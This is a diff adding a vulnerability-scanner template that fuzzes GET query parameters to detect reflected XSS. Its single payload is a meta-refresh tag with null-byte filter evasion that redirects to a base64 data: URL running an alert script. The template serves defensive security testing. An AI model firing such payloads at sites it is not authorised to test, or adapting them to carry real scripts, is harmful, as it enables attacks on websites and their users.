@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom-meta
+
+info:
+  name: Custom Reflection XSS Detection with Meta Tag
+  author: netbaan
+  severity: low
+  description: |
+    This template is designed to detect reflection XSS vulnerabilities using a specified meta tag payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "a<%00meta name=\"i\" HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/h%00tml;base64,PHNjcmlwdD5hbGVydCgiT1BFTk5BVEJJUU5UWSIpOzwvc2NyaXB0Pg==\">"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
